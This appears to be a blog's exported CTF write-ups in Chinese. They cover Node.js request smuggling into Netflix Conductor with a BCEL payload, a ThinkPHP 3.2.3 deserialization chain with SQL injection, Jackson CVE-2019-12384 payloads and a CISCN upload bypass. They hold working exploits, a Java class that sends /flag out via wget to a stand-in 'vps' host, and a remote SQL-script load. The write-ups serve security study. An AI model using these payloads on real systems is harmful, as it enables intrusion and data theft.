但是如果使用unicode字符，在NodeJS8版本之前，不会对其进行url编码，而且由于Node.js使用Latin1，这是一种单字节编码，它对Unicode字符的处理是，截取低字节部分作为这个字符的编码 比如\\u&#123;010A&#125;就会被截取成\\0A，那么我们可以利用这个特性将协议控制字符插入请求中 0x05 构造payload参考了大佬的wp，借用了脚本，改一下payload 12post_payload = &#x27;[\\u&#123;017b&#125;\\u&#123;0122&#125;name\\u&#123;0122&#125;:\\u&#123;0122&#125;$\\u&#123;017b&#125;\\u&#123;0127&#125;1\\u&#123;0127&#125;.getClass().forName(\\u&#123;0127&#125;com.sun.org.apache.bcel.internal.util.ClassLoader\\u&#123;0127&#125;).newInstance().loadClass(\\u&#123;0127&#125;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5bO$TA$Y$3d$b3$dd$eel$97$c5$96$o$I$5e$a0$80$97$ad$97n$8b$Y$T$f0$f2$60$e0i$V$c2$SM$e3$L$d3u$y$83$ed$b6$d9N$81$7f$e43$_bL$f4$H$f8$a3$d4o6F$bcM2$t$dfw$be$cb$9c$9c$f9$fa$ed$d3$X$Ak$a8$7b$98$c0$r$8e9$X$f3$$$$$bb$b8$e2$e1$w$ae$ZX$e0X$f4$e0$a2$c6$b1$c4$b1$cc$e0$3cR$a9$d2O$Y$KA$fd$r$83$fdl$f0F2$94$p$95$ca$X$e3$7eGf$7b$a2$d3$pf2$d6$oy$f7$5c$M$f3$3c$9f$5e$a4$f6$beP$v$c3l$f0$3a$3a$UG$o$ec$89$b4$h$c6$3aSiw$c3$ac$f3$e2$c18K$e4$962$xJ$9bG$aa$d70$7d$3e$7cL2T$fe$9ea$e0aG$a5$e1$e8$80$c1$ba$970$dc$3d$eeJ$5d$3b$d0z$b8$k$86$ad$d5V$e3$fe$c3F$ab$d9X$7d$b0$b6$dej6$9bO$c5$e3$fdD$e8Z$f8$b6$t$ba$fb$i$x$3e$ae$e3$86$8f$9b$b8$c50$7d$be$7d$f3$q$91C$ad$G$a9$8f$c0$3cl$h$r$7f$bc$bf$dd9$94$89f$98$3a$a7v$c7$a9V$7d$d2$ed$91$86_$c9LP$8f$fe$e9$d9$a0$95$f2D$92$e0$e0$bfN$fcF$edd$83D$8eF4Q$kRQ$e7$b6$eee$o$91X$82$f97s$y0$e3$Q$e1$F$ca$8ea$T$D$d4o$9f$819$9fa$b5$L$d5B$dc$b6$abv$dc$$V$8bq$f4$R$ce$9d$P$e0$af$de$c3$8d$u$u$9d$d2$a0$8d$gV$e8$a3$z$94it$B$9c$b0$40l$Rsp$a8V$a2$w$t$b7$5cr$c4C$85$aa$VX$df$89d$iS$G$aa6$f5L$e3$e2O$R$f3t$99$b9$a7y$60$96$3a9$e1$T$ce$e4$9ag$7f$A$94B$cd$d5$81$C$A$A\\u&#123;0127&#125;).newInstance().class\\u&#123;017d&#125;\\u&#123;0122&#125;,\\u&#123;0122&#125;ownerEmail\\u&#123;0122&#125;:\\u&#123;0122&#125;test@example.org\\u&#123;0122&#125;,\\u&#123;0122&#125;retryCount\\u&#123;0122&#125;:\\u&#123;0122&#125;3\\u&#123;0122&#125;,\\u&#123;0122&#125;timeoutSeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;1200\\u&#123;0122&#125;,\\u&#123;0122&#125;inputKeys\\u&#123;0122&#125;:[\\u&#123;0122&#125;sourceRequestId\\u&#123;0122&#125;,\\u&#123;0122&#125;qcElementType\\u&#123;0122&#125;],\\u&#123;0122&#125;outputKeys\\u&#123;0122&#125;:[\\u&#123;0122&#125;state\\u&#123;0122&#125;,\\u&#123;0122&#125;skipped\\u&#123;0122&#125;,\\u&#123;0122&#125;result\\u&#123;0122&#125;],\\u&#123;0122&#125;timeoutPolicy\\u&#123;0122&#125;:\\u&#123;0122&#125;TIME_OUT_WF\\u&#123;0122&#125;,\\u&#123;0122&#125;retryLogic\\u&#123;0122&#125;:\\u&#123;0122&#125;FIXED\\u&#123;0122&#125;,\\u&#123;0122&#125;retryDelaySeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;600\\u&#123;0122&#125;,\\u&#123;0122&#125;responseTimeoutSeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;3600\\u&#123;0122&#125;,\\u&#123;0122&#125;concurrentExecLimit\\u&#123;0122&#125;:\\u&#123;0122&#125;100\\u&#123;0122&#125;,\\u&#123;0122&#125;rateLimitFrequencyInSeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;60\\u&#123;0122&#125;,\\u&#123;0122&#125;rateLimitPerFrequency\\u&#123;0122&#125;:\\u&#123;0122&#125;50\\u&#123;0122&#125;,\\u&#123;0122&#125;isolationgroupId\\u&#123;0122&#125;:\\u&#123;0122&#125;myIsolationGroupId\\u&#123;0122&#125;\\u&#123;017d&#125;]&#x27;console.log(encodeURI(encodeURI(encodeURI(&#x27;http://0.0.0.0:3000/\\u&#123;0120&#125;HTTP/1.1\\u&#123;010D&#125;\\u&#123;010A&#125;Host:127.0.0.1:3000\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;POST\\u&#123;0120&#125;/search?url=http://10.0.85.9:8080/api/metadata/taskdefs\\u&#123;0120&#125;HTTP/1.1\\u&#123;010D&#125;\\u&#123;010A&#125;Host:127.0.0.1:3000\\u&#123;010D&#125;\\u&#123;010A&#125;Content-Type:application/json\\u&#123;010D&#125;\\u&#123;010A&#125;Content-Length:&#x27; + post_payload.length + &#x27;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;&#x27; + post_payload+ &#x27;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;GET\\u&#123;0120&#125;/private&#x27;)))) 123记录进路径的时候使用的Latin1编码，上面所有unicode编码只会被截断一个字节get请求结束用两个换行，post四个换行三次URI编码是对应服务端的两次URI解码吗？猜测：两次解码是为了解决url传递的问题，对unicode字符做一次uri编码就可以将非ascii字符转化，方便传递，然后再编码一次，这一次编码不存在unicode字符，为了应对后端服务器进行的非utf-8的一次解码，之后后端再进行一次utf-8的解码即可得到原来unicode字符 生成的payload 1http:&#x2F;&#x2F;0.0.0.0:3000&#x2F;%2525C4%2525A0HTTP&#x2F;1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258APOST%2525C4%2525A0&#x2F;search?url&#x3D;http:&#x2F;&#x2F;10.0.85.9:8080&#x2F;api&#x2F;metadata&#x2F;taskdefs%2525C4%2525A0HTTP&#x2F;1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258AContent-Type:application&#x2F;json%2525C4%25258D%2525C4%25258AContent-Length:1629%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%25255B%2525C5%2525BB%2525C4%2525A2name%2525C4%2525A2:%2525C4%2525A2$%2525C5%2525BB%2525C4%2525A71%2525C4%2525A7.getClass().forName(%2525C4%2525A7com.sun.org.apache.bcel.internal.util.ClassLoader%2525C4%2525A7).newInstance().loadClass(%2525C4%2525A7$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5bO$TA$Y$3d$b3$dd$eel$97$c5$96$o$I$5e$a0$80$97$ad$97n$8b$Y$T$f0$f2$60$e0i$V$c2$SM$e3$L$d3u$y$83$ed$b6$d9N$81$7f$e43$_bL$f4$H$f8$a3$d4o6F$bcM2$t$dfw$be$cb$9c$9c$f9$fa$ed$d3$X$Ak$a8$7b$98$c0$r$8e9$X$f3$$$$$bb$b8$e2$e1$w$ae$ZX$e0X$f4$e0$a2$c6$b1$c4$b1$cc$e0$3cR$a9$d2O$Y$KA$fd$r$83$fdl$f0F2$94$p$95$ca$X$e3$7eGf$7b$a2$d3$pf2$d6$oy$f7$5c$M$f3$3c$9f$5e$a4$f6$beP$v$c3l$f0$3a$3a$UG$o$ec$89$b4$h$c6$3aSiw$c3$ac$f3$e2$c18K$e4$962$xJ$9bG$aa$d70$7d$3e$7cL2T$fe$9ea$e0aG$a5$e1$e8$80$c1$ba$970$dc$3d$eeJ$5d$3b$d0z$b8$k$86$ad$d5V$e3$fe$c3F$ab$d9X$7d$b0$b6$dej6$9bO$c5$e3$fdD$e8Z$f8$b6$t$ba$fb$i$x$3e$ae$e3$86$8f$9b$b8$c50$7d$be$7d$f3$q$91C$ad$G$a9$8f$c0$3cl$h$r$7f$bc$bf$dd9$94$89f$98$3a$a7v$c7$a9V$7d$d2$ed$91$86_$c9LP$8f$fe$e9$d9$a0$95$f2D$92$e0$e0$bfN$fcF$edd$83D$8eF4Q$kRQ$e7$b6$eee$o$91X$82$f97s$y0$e3$Q$e1$F$ca$8ea$T$D$d4o$9f$819$9fa$b5$L$d5B$dc$b6$abv$dc$$V$8bq$f4$R$ce$9d$P$e0$af$de$c3$8d$u$u$9d$d2$a0$8d$gV$e8$a3$z$94it$B$9c$b0$40l$Rsp$a8V$a2$w$t$b7$5cr$c4C$85$aa$VX$df$89d$iS$G$aa6$f5L$e3$e2O$R$f3t$99$b9$a7y$60$96$3a9$e1$T$ce$e4$9ag$7f$A$94B$cd$d5$81$C$A$A%2525C4%2525A7).newInstance().class%2525C5%2525BD%2525C4%2525A2,%2525C4%2525A2ownerEmail%2525C4%2525A2:%2525C4%2525A2test@example.org%2525C4%2525A2,%2525C4%2525A2retryCount%2525C4%2525A2:%2525C4%2525A23%2525C4%2525A2,%2525C4%2525A2timeoutSeconds%2525C4%2525A2:%2525C4%2525A21200%2525C4%2525A2,%2525C4%2525A2inputKeys%2525C4%2525A2:%25255B%2525C4%2525A2sourceRequestId%2525C4%2525A2,%2525C4%2525A2qcElementType%2525C4%2525A2%25255D,%2525C4%2525A2outputKeys%2525C4%2525A2:%25255B%2525C4%2525A2state%2525C4%2525A2,%2525C4%2525A2skipped%2525C4%2525A2,%2525C4%2525A2result%2525C4%2525A2%25255D,%2525C4%2525A2timeoutPolicy%2525C4%2525A2:%2525C4%2525A2TIME_OUT_WF%2525C4%2525A2,%2525C4%2525A2retryLogic%2525C4%2525A2:%2525C4%2525A2FIXED%2525C4%2525A2,%2525C4%2525A2retryDelaySeconds%2525C4%2525A2:%2525C4%2525A2600%2525C4%2525A2,%2525C4%2525A2responseTimeoutSeconds%2525C4%2525A2:%2525C4%2525A23600%2525C4%2525A2,%2525C4%2525A2concurrentExecLimit%2525C4%2525A2:%2525C4%2525A2100%2525C4%2525A2,%2525C4%2525A2rateLimitFrequencyInSeconds%2525C4%2525A2:%2525C4%2525A260%2525C4%2525A2,%2525C4%2525A2rateLimitPerFrequency%2525C4%2525A2:%2525C4%2525A250%2525C4%2525A2,%2525C4%2525A2isolationgroupId%2525C4%2525A2:%2525C4%2525A2myIsolationGroupId%2525C4%2525A2%2525C5%2525BD%25255D%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258AGET%2525C4%2525A0&#x2F;private 最后注意一点，Java Runtime.getRuntime().exec在执行命令的时候无法解释一些特殊符号，比如&amp;,`,|等等，可以用两种方式解决 第一，http://www.jackson-t.ca/runtime-exec-payloads.html 把命令编码一下 第二，传入数组 12345678910111213public class Evil&#123; public Evil()&#123; try&#123; String[] command = &#123; &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;wget http://vps:port?a=`cat /flag`&quot;&#125;; Runtime.getRuntime().exec(command); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(final String[]array)&#123; &#125;&#125; 这里解释了特殊符号`是因为调用了sh，是sh解释了特殊符号","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"Nodejs","slug":"CTF/Nodejs","permalink":"https://123-prog.github.io/categories/CTF/Nodejs/"}],"tags":[{"name":"nodejs代码审计","slug":"nodejs代码审计","permalink":"https://123-prog.github.io/tags/nodejs%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"Netflix Conductor 1day","slug":"Netflix-Conductor-1day","permalink":"https://123-prog.github.io/tags/Netflix-Conductor-1day/"},{"name":"Java BCEL 编码","slug":"Java-BCEL-编码","permalink":"https://123-prog.github.io/tags/Java-BCEL-%E7%BC%96%E7%A0%81/"},{"name":"nodejs请求走私","slug":"nodejs请求走私","permalink":"https://123-prog.github.io/tags/nodejs%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"}]},{"title":"红明谷CTF 2021 EasyTP","slug":"红明谷CTF-2021-EasyTP","date":"2021-07-07T04:50:12.000Z","updated":"2021-09-22T09:54:12.021Z","comments":true,"path":"2021/07/07/红明谷CTF-2021-EasyTP/","link":"","permalink":"https://123-prog.github.io/2021/07/07/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/","excerpt":"0x01www.zip获得源码，查看tp版本 ./ThinkPHP/ThinkPHP.php","text":"0x01www.zip获得源码，查看tp版本 ./ThinkPHP/ThinkPHP.php 123456789101112131415161718192021222324252627&lt;?php// +----------------------------------------------------------------------// | ThinkPHP [ WE CAN DO IT JUST THINK IT ]// +----------------------------------------------------------------------// | Copyright (c) 2006-2014 http://thinkphp.cn All rights reserved.// +----------------------------------------------------------------------// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )// +----------------------------------------------------------------------// | Author: liu21st &lt;liu21st@gmail.com&gt;// +----------------------------------------------------------------------//----------------------------------// ThinkPHP公共入口文件//----------------------------------// 记录开始运行时间$GLOBALS[&#x27;_beginTime&#x27;] = microtime(true);// 记录内存初始使用define(&#x27;MEMORY_LIMIT_ON&#x27;, function_exists(&#x27;memory_get_usage&#x27;));if (MEMORY_LIMIT_ON) &#123; $GLOBALS[&#x27;_startUseMems&#x27;] = memory_get_usage();&#125;// 版本信息const THINK_VERSION = &#x27;3.2.3&#x27;;...... 可以看到版本是3.2.3 ./Application/Home/Controller/IndexController.class.php 123456789101112131415&lt;?phpnamespace Home\\Controller;use Think\\Controller;classIndexController extends Controller &#123; public function index()&#123; echo(unserialize(base64_decode(file_get_contents(&#x27;php://input&#x27;)))); $this-&gt;display(); &#125; public function test()&#123; echo(unserialize(base64_decode(file_get_contents(&#x27;php://input&#x27;)))); &#125;&#125; 可以看到是php的反序列化漏洞 找一下这个版本对应存在的一些漏洞，下面是一个网上找到的可用的pop链 0x02 pop链首先，全局搜索__destruct()作为反序列化利用的起点 在文件/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php处 1234567/** * 析构方法，用于销毁图像资源 */ public function __destruct() &#123; empty($this-&gt;img) || $this-&gt;img-&gt;destroy(); &#125; 这是一个销毁图像的析构函数，这里的img作为类的成员其实是可控的，所以接下来的目标是寻找一个可利用类，这个类拥有destroy()方法，且需要的参数可控 全局搜索destroy() 在文件/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php 123456789** * 删除Session * @access public * @param string $sessID */ public function destroy($sessID) &#123; return $this-&gt;handle-&gt;delete($this-&gt;sessionName . $sessID); &#125; 这里有参数，但php5允许这种情况出现，可以无参调用不报错 简单看一下，发现handle参数可控 全局搜索delete()方法 在文件/ThinkPHP/Library/Think/Model.class.php中 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273/** * 删除数据 * @access public * @param mixed $options 表达式 * @return mixed */public function delete($options = array())&#123; $pk = $this-&gt;getPk(); if (empty($options) &amp;&amp; empty($this-&gt;options[&#x27;where&#x27;])) &#123; // 如果删除条件为空 则删除当前数据对象所对应的记录 if (!empty($this-&gt;data) &amp;&amp; isset($this-&gt;data[$pk])) &#123; return $this-&gt;delete($this-&gt;data[$pk]); &#125; else &#123; return false; &#125; &#125; if (is_numeric($options) || is_string($options)) &#123; // 根据主键删除记录 if (strpos($options, &#x27;,&#x27;)) &#123; $where[$pk] = array(&#x27;IN&#x27;, $options); &#125; else &#123; $where[$pk] = $options; &#125; $options = array(); $options[&#x27;where&#x27;] = $where; &#125; // 根据复合主键删除记录 if (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk)) &#123; $count = 0; foreach (array_keys($options) as $key) &#123; if (is_int($key)) &#123; $count++; &#125; &#125; if (count($pk) == $count) &#123; $i = 0; foreach ($pk as $field) &#123; $where[$field] = $options[$i]; unset($options[$i++]); &#125; $options[&#x27;where&#x27;] = $where; &#125; else &#123; return false; &#125; &#125; // 分析表达式 $options = $this-&gt;_parseOptions($options); if (empty($options[&#x27;where&#x27;])) &#123; // 如果条件为空 不进行删除操作 除非设置 1=1 return false; &#125; if (is_array($options[&#x27;where&#x27;]) &amp;&amp; isset($options[&#x27;where&#x27;][$pk])) &#123; $pkValue = $options[&#x27;where&#x27;][$pk]; &#125; if (false === $this-&gt;_before_delete($options)) &#123; return false; &#125; $result = $this-&gt;db-&gt;delete($options); if (false !== $result &amp;&amp; is_numeric($result)) &#123; $data = array(); if (isset($pkValue)) &#123; $data[$pk] = $pkValue; &#125; $this-&gt;_after_delete($data, $options); &#125; // 返回删除记录个数 return $result;&#125; 主要分析这一部分 123456789101112public function delete($options = array()) &#123; $pk = $this-&gt;getPk(); if (empty($options) &amp;&amp; empty($this-&gt;options[&#x27;where&#x27;])) &#123; // 如果删除条件为空 则删除当前数据对象所对应的记录 if (!empty($this-&gt;data) &amp;&amp; isset($this-&gt;data[$pk])) &#123; return $this-&gt;delete($this-&gt;data[$pk]); &#125; else &#123; return false; &#125; &#125; $this-&gt;pk是可控的，$options是从上一个跳板类中传过来的，看一下，我们只能控制传过来一个字符串类型的值，或者不传，这里选择不传，在下面看到这么关键的一行return $this-&gt;delete($this-&gt;data[$pk]);这里是递归调用，$this-&gt;data[$pk]变成了我们可控的参数 !empty($this-&gt;data) &amp;&amp; isset($this-&gt;data[$pk])这个条件也完全在我们控制之下，所以可行 绕这么一下之后就可以执行可控参数的delete() 在下面发现，delete()的实际调用 1$result &#x3D; $this-&gt;db-&gt;delete($options); 所以最终的调用是文件/ThinkPHP/Library/Think/Db/Driver.class.php中的delete() 12345678910111213141516171819202122public function delete($options = array()) &#123; $this-&gt;model = $options[&#x27;model&#x27;]; $this-&gt;parseBind(!empty($options[&#x27;bind&#x27;]) ? $options[&#x27;bind&#x27;] : array()); $table = $this-&gt;parseTable($options[&#x27;table&#x27;]); $sql = &#x27;DELETE FROM &#x27; . $table; if (strpos($table, &#x27;,&#x27;)) &#123;// 多表删除支持USING和JOIN操作 if (!empty($options[&#x27;using&#x27;])) &#123; $sql .= &#x27; USING &#x27; . $this-&gt;parseTable($options[&#x27;using&#x27;]) . &#x27; &#x27;; &#125; $sql .= $this-&gt;parseJoin(!empty($options[&#x27;join&#x27;]) ? $options[&#x27;join&#x27;] : &#x27;&#x27;); &#125; $sql .= $this-&gt;parseWhere(!empty($options[&#x27;where&#x27;]) ? $options[&#x27;where&#x27;] : &#x27;&#x27;); if (!strpos($table, &#x27;,&#x27;)) &#123; // 单表删除支持order和limit $sql .= $this-&gt;parseOrder(!empty($options[&#x27;order&#x27;]) ? $options[&#x27;order&#x27;] : &#x27;&#x27;) . $this-&gt;parseLimit(!empty($options[&#x27;limit&#x27;]) ? $options[&#x27;limit&#x27;] : &#x27;&#x27;); &#125; $sql .= $this-&gt;parseComment(!empty($options[&#x27;comment&#x27;]) ? $options[&#x27;comment&#x27;] : &#x27;&#x27;); return $this-&gt;execute($sql, !empty($options[&#x27;fetch_sql&#x27;]) ? true : false); &#125; sql语句是$sql = &#39;DELETE FROM &#39; . $table; 这里$table是可控参数 poc.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?phpnamespace Think\\Db\\Driver&#123; use PDO; class Mysql&#123; protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true // 开启才能读取文件 ); protected $config = array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;&quot;, &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;, &quot;hostport&quot; =&gt; &quot;3306&quot;, &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;root&quot; ); &#125;&#125;namespace Think\\Image\\Driver&#123; use Think\\Session\\Driver\\Memcache; class Imagick&#123; private $img; public function __construct()&#123; $this-&gt;img = new Memcache(); &#125; &#125;&#125;namespace Think\\Session\\Driver&#123; use Think\\Model; class Memcache&#123; protected $handle; public function __construct()&#123; $this-&gt;handle = new Model(); &#125; &#125;&#125;namespace Think&#123; use Think\\Db\\Driver\\Mysql; class Model&#123; protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct()&#123; $this-&gt;db = new Mysql(); $this-&gt;options[&#x27;where&#x27;] = &#x27;&#x27;; $this-&gt;pk = &#x27;id&#x27;; $this-&gt;data[$this-&gt;pk] = array( &quot;table&quot; =&gt; &quot;mysql.user where 1=updatexml(1,concat(0x7e,(select right(flag,16) from test.flag),0x7e),1)#&quot;, &quot;where&quot; =&gt; &quot;1=1&quot; ); &#125; &#125;&#125;namespace &#123; echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick()));&#125; 0x03 mysql恶意服务端读取客户端文件开启一个恶意服务端 修改mysql服务器配置连接远端恶意服务器 再读一下/flag.sh 看到flag存在数据库中，在test.flag.flag 通过上面的文件内容，已经可以知道，其本地的 mysql账号密码为root，将数据库配置改成连接其本地的数据库 报错注入 可以得到部分flag 通过字符串截取可以拿到后面部分","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"php反序列化","slug":"CTF/php反序列化","permalink":"https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"mysql恶意服务端读取客户端文件","slug":"mysql恶意服务端读取客户端文件","permalink":"https://123-prog.github.io/tags/mysql%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6/"},{"name":"mysql注入","slug":"mysql注入","permalink":"https://123-prog.github.io/tags/mysql%E6%B3%A8%E5%85%A5/"}]},{"title":"Java 反序列化","slug":"Java-反序列化","date":"2021-06-22T14:27:53.000Z","updated":"2021-07-18T14:10:37.635Z","comments":true,"path":"2021/06/22/Java-反序列化/","link":"","permalink":"https://123-prog.github.io/2021/06/22/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"Jackson反序列化漏洞#CVE-2019-12384123456Jackson 远程命令执行漏洞影响版本：Jackson-databind 2.X &lt; 2.9.9.1复现环境：docker pull tech1iu&#x2F;servlet-with-jackson:2.9.8复现版本：jackson 2.9.8靶机运行：Ubuntu18.04 64位漏洞介绍：开启了enableDefaultTyping(),而且黑名单过滤不完整","text":"Jackson反序列化漏洞#CVE-2019-12384123456Jackson 远程命令执行漏洞影响版本：Jackson-databind 2.X &lt; 2.9.9.1复现环境：docker pull tech1iu&#x2F;servlet-with-jackson:2.9.8复现版本：jackson 2.9.8靶机运行：Ubuntu18.04 64位漏洞介绍：开启了enableDefaultTyping(),而且黑名单过滤不完整 ssrf:1poc&#x3D;[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:tcp:&#x2F;&#x2F;xxx:1001&#x2F;hello&quot;&#125;] rce:12345678910//inject.sqlCREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException &#123; String[] command = &#123;&quot;bash&quot;, &quot;-c&quot;, cmd&#125;; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;; &#125;$$;CALL SHELLEXEC(&#x27;touch shell.txt&#x27;) //执行的命令//poc=[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://xxx:1234/inject.sql&#x27;&quot;&#125;] #Spring Jackson1[&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;ldap:&#x2F;&#x2F;xxx:1389&#x2F;iafwnq&quot;&#125;]","categories":[{"name":"其他","slug":"其他","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"Java反序列化","slug":"Java反序列化","permalink":"https://123-prog.github.io/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"ciscn2021 upload","slug":"ciscn2021-upload","date":"2021-06-01T01:35:23.000Z","updated":"2021-09-22T09:55:41.337Z","comments":true,"path":"2021/06/01/ciscn2021-upload/","link":"","permalink":"https://123-prog.github.io/2021/06/01/ciscn2021-upload/","excerpt":"ciscn2021 upload源码","text":"ciscn2021 upload源码 12345678910111213141516171819202122232425262728293031&lt;?phpif (!isset($_GET[&quot;ctf&quot;])) &#123; highlight_file(__FILE__); die();&#125;if(isset($_GET[&quot;ctf&quot;])) $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;upload&quot;) &#123; if ($_FILES[&#x27;postedFile&#x27;][&#x27;size&#x27;] &gt; 1024*512) &#123; die(&quot;这么大个的东西你是想d我吗？&quot;); &#125; $imageinfo = getimagesize($_FILES[&#x27;postedFile&#x27;][&#x27;tmp_name&#x27;]); if ($imageinfo === FALSE) &#123; die(&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;); &#125; if ($imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1) &#123; die(&quot;东西不能方方正正的话就很讨厌&quot;); &#125; $fileName=urldecode($_FILES[&#x27;postedFile&#x27;][&#x27;name&#x27;]); if(stristr($fileName,&quot;c&quot;) || stristr($fileName,&quot;i&quot;) || stristr($fileName,&quot;h&quot;) || stristr($fileName,&quot;ph&quot;)) &#123; die(&quot;有些东西让你传上去的话那可不得了&quot;); &#125; $imagePath = &quot;image/&quot; . mb_strtolower($fileName); if(move_uploaded_file($_FILES[&quot;postedFile&quot;][&quot;tmp_name&quot;], $imagePath)) &#123; echo &quot;upload success, image at $imagePath&quot;; &#125; else &#123; die(&quot;传都没有传上去&quot;); &#125;&#125; 隐藏文件example.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpif (!isset($_GET[&quot;ctf&quot;])) &#123; highlight_file(__FILE__); die();&#125;if(isset($_GET[&quot;ctf&quot;])) $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;poc&quot;) &#123; $zip = new \\ZipArchive(); $name_for_zip = &quot;example/&quot; . $_POST[&quot;file&quot;]; if(explode(&quot;.&quot;,$name_for_zip)[count(explode(&quot;.&quot;,$name_for_zip))-1]!==&quot;zip&quot;) &#123; die(&quot;要不咱们再看看？&quot;); &#125; if ($zip-&gt;open($name_for_zip) !== TRUE) &#123; die (&quot;都不能解压呢&quot;); &#125; echo &quot;可以解压，我想想存哪里&quot;; $pos_for_zip = &quot;/tmp/example/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]); $zip-&gt;extractTo($pos_for_zip); $zip-&gt;close(); unlink($name_for_zip); $files = glob(&quot;$pos_for_zip/*&quot;); foreach($files as $file)&#123; if (is_dir($file)) &#123; continue; &#125; $first = imagecreatefrompng($file); $size = min(imagesx($first), imagesy($first)); $second = imagecrop($first, [&#x27;x&#x27; =&gt; 0, &#x27;y&#x27; =&gt; 0, &#x27;width&#x27; =&gt; $size, &#x27;height&#x27; =&gt; $size]); if ($second !== FALSE) &#123; $final_name = pathinfo($file)[&quot;basename&quot;]; imagepng($second, &#x27;example/&#x27;.$final_name); imagedestroy($second); &#125; imagedestroy($first); unlink($file); &#125;&#125; 大概的功能是在index.php处可以上传文件，在example.php处可以解压zip文件，而且路径全部可知 所以思路是 在index.php处上传一个zip压缩包，再利用example.php解压压缩包，将压缩包里的恶意文件放在指定路径，因为这里对压缩包里面的文件有一些图片处理，如果不是图片过不了，但我们可以传一个图片马，改一下后缀就可以 生成一个图片马，改后缀为php，压缩成zip 上传zip文件 由于对上传文件后缀名有过滤，但注意到后面的mb_strtolower()，可以用一些Unicode字符代替 这里用İ(%c4%b0)绕过对i的过滤 getimagesize()绕过： 12#define width 1#define height 1 然后再利用example.php对1.zip进行解压 最后直接访问example/1.php拿到shell","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"文件上传","slug":"CTF/文件上传","permalink":"https://123-prog.github.io/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://123-prog.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"getimagesize绕过","slug":"getimagesize绕过","permalink":"https://123-prog.github.io/tags/getimagesize%E7%BB%95%E8%BF%87/"},{"name":"mb_strtolower()的利用","slug":"mb-strtolower-的利用","permalink":"https://123-prog.github.io/tags/mb-strtolower-%E7%9A%84%E5%88%A9%E7%94%A8/"}]},{"title":"CISCN 2021 web 部分wp","slug":"CISCN2021-web部分wp","date":"2021-05-18T14:26:06.000Z","updated":"2021-09-22T09:55:00.391Z","comments":true,"path":"2021/05/18/CISCN2021-web部分wp/","link":"","permalink":"https://123-prog.github.io/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86wp/","excerpt":"0x01 easy_sql","text":"0x01 easy_sql 报错注入，过滤了information，sys，innodb，union等等 